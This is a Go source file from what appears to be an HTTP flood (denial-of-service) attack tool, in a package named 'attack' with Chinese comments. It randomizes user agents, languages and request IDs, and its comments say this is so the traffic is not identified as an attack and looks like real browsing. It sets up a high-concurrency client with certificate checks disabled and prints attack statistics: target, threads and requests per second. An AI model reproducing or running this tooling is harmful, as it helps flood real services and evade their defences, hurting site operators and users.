// http_config.go
package attack

import (
	"crypto/rand"
	"crypto/tls"
	"fmt"
	"math/big"
	"net"
	"net/http"
	"sync/atomic"
	"time"
	"context"
)

// addHeaders 添加HTTP请求头 - 优化确保Header正确添加
func (h *HTTP) addHeaders(req *http.Request) {
	// 如果有自定义头部，优先使用自定义头部
	if h.Header != nil && len(h.Header) > 0 {
		for k, v := range h.Header {
			// 设置头部
			req.Header.Set(k, v)
		}
		// 添加随机ID，防止被识别为攻击流量
		req.Header.Set("X-Request-ID", generateRandomID())
		return
	}
	
	// 否则使用默认请求头
	for k, v := range GetDefaultHeaders() {
		req.Header.Set(k, v)
	}
}

// generateRandomID 生成随机ID，增加请求的随机性
func generateRandomID() string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	id := make([]byte, 16)
	for i := range id {
		n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(chars))))
		id[i] = chars[n.Int64()]
	}
	return string(id)
}

// GetDefaultHeaders 获取默认的HTTP请求头
func GetDefaultHeaders() map[string]string {
	// 增加更多现代浏览器常用的请求头，使流量看起来更真实
	return map[string]string{
		"User-Agent":      GetRandomUserAgent(),
		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		"Accept-Language": GetRandomLanguage(),
		"Accept-Encoding": "gzip, deflate, br",
		"Connection":      GetRandomConnection(),
		"Cache-Control":   "no-cache",
		"Pragma":          "no-cache",
		"Sec-Fetch-Dest":  "document",
		"Sec-Fetch-Mode":  "navigate",
		"Sec-Fetch-Site":  "none",
		"Sec-Fetch-User":  "?1",
		"Upgrade-Insecure-Requests": "1",
	}
}

// GetRandomConnection 随机返回连接类型
func GetRandomConnection() string {
	connections := []string{
		"keep-alive",
		"close",
	}
	idx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(connections))))
	return connections[idx.Int64()]
}

// GetRandomLanguage 获取随机语言设置
func GetRandomLanguage() string {
	languages := []string{
		"en-US,en;q=0.9",
		"en-GB,en;q=0.8,en-US;q=0.7",
		"zh-CN,zh;q=0.9,en;q=0.8",
		"zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7",
		"ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7",
		"ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
		"de-DE,de;q=0.9,en;q=0.8",
		"fr-FR,fr;q=0.9,en;q=0.8",
		"ru-RU,ru;q=0.9,en;q=0.8",
	}
	idx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(languages))))
	return languages[idx.Int64()]
}

// GetRandomUserAgent 获取随机用户代理 - 增加更多现代浏览器的UA
func GetRandomUserAgent() string {
	userAgents := []string{
		// Chrome
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
		// Firefox
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0",
		"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0",
		// Safari
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
		// Edge
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.200",
		// Mobile
		"Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
	}

	// 随机选择一个用户代理
	idx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(userAgents))))
	return userAgents[idx.Int64()]
}

// newClient 创建HTTP客户端 - 增加了连接池和更多配置选项
func (h *HTTP) newClient() *http.Client {
	// 创建自定义传输配置
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,            // 忽略SSL证书错误
			MinVersion:         tls.VersionTLS12, // 使用安全的TLS版本
		},
		DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
			dialer := &net.Dialer{
				Timeout:   5 * time.Second,  // 连接超时
				KeepAlive: 30 * time.Second, // TCP keepalive
			}
			conn, err := dialer.DialContext(ctx, network, addr)
			return conn, err
		},
		MaxIdleConns:          1000,              // 最大空闲连接数
		MaxConnsPerHost:       100,               // 每个主机的最大连接数
		MaxIdleConnsPerHost:   100,               // 每个主机的最大空闲连接数
		IdleConnTimeout:       90 * time.Second,  // 空闲连接超时
		TLSHandshakeTimeout:   10 * time.Second,  // TLS握手超时
		ExpectContinueTimeout: 1 * time.Second,   // 100-continue超时
		DisableCompression:    true,              // 禁用压缩，以便更快发送请求
		DisableKeepAlives:     false,             // 启用KeepAlive
		ForceAttemptHTTP2:     true,              // 尝试使用HTTP/2
	}

	return &http.Client{
		Transport: transport,
		Timeout:   30 * time.Second, // 整个请求的超时时间
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse // 不跟随重定向
		},
	}
}

// printSummary 打印攻击统计信息
func (h *HTTP) printSummary() {
	endTime := time.Now()
	duration := endTime.Sub(h.startTime)

	// 计算每秒请求数
	requestsPerSecond := float64(0)
	if duration.Seconds() > 0 {
		requestsPerSecond = float64(atomic.LoadInt64(&h.sentRequests)) / duration.Seconds()
	}

	// 计算成功率
	successRate := float64(0)
	sentReqs := atomic.LoadInt64(&h.sentRequests)
	if sentReqs > 0 {
		successRate = float64(atomic.LoadInt64(&h.recvResponses)) / float64(sentReqs) * 100
	}

	fmt.Printf("\n=== HTTP攻击统计 ===\n")
	fmt.Printf("开始时间: %s\n", h.startTime.Format("2006/01/02 15:04:05"))
	fmt.Printf("结束时间: %s\n", endTime.Format("2006/01/02 15:04:05"))
	fmt.Printf("攻击目标: %s\n", h.Target)
	fmt.Printf("请求方法: %s\n", h.Method)
	fmt.Printf("线程数量: %d\n", h.Threads)
	fmt.Printf("发送请求: %d (%.2f 请求/秒)\n",
		sentReqs,
		requestsPerSecond)
	fmt.Printf("接收响应: %d (成功率: %.2f%%)\n",
		atomic.LoadInt64(&h.recvResponses),
		successRate)
	fmt.Printf("发送数据: %.2f MB, 接收数据: %.2f MB\n",
		float64(atomic.LoadInt64(&h.sentBytes))/(1024*1024),
		float64(atomic.LoadInt64(&h.recvBytes))/(1024*1024))
	fmt.Printf("连接错误: %d\n",
		atomic.LoadInt64(&h.connErrors))
	fmt.Printf("====================\n")
}

// estimateRequestSize 估算HTTP请求大小
func estimateRequestSize(req *http.Request) int {
	size := len(req.Method) + len(req.URL.Path) + len("HTTP/1.1") + 4 // 请求行

	// 头部
	for name, values := range req.Header {
		for _, value := range values {
			size += len(name) + len(value) + 4 // 包括冒号、空格和CRLF
		}
	}

	size += 2 // 头部和主体之间的空行

	return size
}